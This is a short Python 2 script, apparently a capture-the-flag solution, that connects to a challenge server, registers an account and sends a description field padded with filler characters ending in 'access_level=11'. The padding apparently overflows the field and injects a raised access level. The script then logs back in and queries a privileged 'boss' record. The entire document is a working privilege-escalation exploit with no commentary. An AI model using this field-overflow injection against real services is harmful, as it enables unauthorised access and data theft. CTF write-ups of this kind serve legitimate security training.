#!/usr/bin/env python
import socket
from time import sleep

s = socket.socket()
s.connect(('wildwildweb.fluxfingers.net', 1410))

username = 'balalaika2'
password = '[j[kscjcen'

print s.recv(1024)
s.send("register " + username + ':' + password + '\n')
sleep(0.5)

print s.recv(1024)
s.send("set_description aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaccess_level=11\n")
sleep(0.5)

print s.recv(1024)
s.send("logout\n")
sleep(0.5)

print s.recv(1024)
s.send("user "+ username+ "\n")
sleep(0.5)

print s.recv(1024)
s.send("pass " + password + "\n")
sleep(0.5)

print s.recv(1024)
s.send("whois boss\n")
sleep(0.5)

print s.recv(1024)